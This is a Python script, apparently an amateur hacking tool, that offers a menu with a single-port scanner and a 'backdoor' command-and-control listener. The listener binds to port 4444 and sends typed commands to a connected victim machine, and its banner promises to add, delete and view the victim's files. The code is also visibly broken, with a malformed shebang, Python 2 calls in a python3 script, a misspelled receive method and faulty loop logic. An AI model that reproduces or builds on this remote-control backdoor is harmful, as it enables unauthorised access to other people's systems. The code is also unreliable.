#!/bin/bash/env python3
import os
import sys
import socket, subprocess as sp
print("                                             Coded By @msfcode                     ")
print("                                             exploits, Coffee                                  ")
print("                                                KEEP-CALM")
print("                                             They Watch YOU !!                      ")
print("                                        \u001b[36mhttps://github.com/msfcode")
print("")
print("")
print("")
print("")
print("                                                \u001b[31mAttacks ")
print("")
print("                                \u001b[37m1-Port Scanning          2-Backdoor ")
print("")
number = int(input("Type the attack number>>"))
if number == 1:
  print("")
  print("")
  print("                 \u001b[31mPort Scanners are an important tool when you want to investigate any remote or")
  print("                local network for security considerations. Used by programmers and network administrators,")    
  print("                these port scanners are used to mainly know what ports are being used by what applications,") 
  print("                     so you can identify malicious programs right away.")
  print("")
  print("")
  socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  host = input("\u001b[32mType The Ip address>>")
  port = int(input("Type The Port>>"))
  if socket.connect_ex((host, port)):
   print("\u001b[31mThe Port is closed")
  else: 
   print("\u001b[33mThe Port is opened")
if number == 2:
   print("")
   print("              \u001b[36mA backdoor is a malware type that negates normal authentication procedures to access a system.") 
   print("              As a result, remote access is granted to resources within an application,") 
   print("              such as databases and file servers, giving perpetrators the ability to remotely") 
   print("                            issue system commands and update malware.")
   print("")
   print("")
   print("                                               BackDoor coded by @msfcode")
   print("                                                     GET acces NOW !!")
   print("                                             ONLY TO TEST YOUR SYSTEM SECURITY !!")
   print("                                                  i'm Not Responsable ")
   print("                       #GAiN_ACCESS  #add_files #remove_files #view_files #add_directory #delete_directory ")
   print("")
   print("")
   s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
   host = "192.168.1.7"
   port = 4444
   s.bind((host,port))
   print("                                      [*] The Server is Currently Running Dude", host)
   print("")
   print("                                      [*] Waiting for any incomming connections...")
   s.listen(1)
   conn, addr = s.accept()
   print("")
   print(addr, "[*] Connected to ", host)
   print("")
   while 1:
     command = input("#> ")
     if command != ("exit()"):
       if command == "": continue
       conn.send(command) 
       result = conn.recev(1024)
       total_size = long(result[:16])
       result = result[16:]
       while total_size > len(result):
        data = conn.recev(1024)
        result += data
       else:
        conn.send("exit()")
        print("[*]Sorry,Dude try again...[*]")
        break
s.close()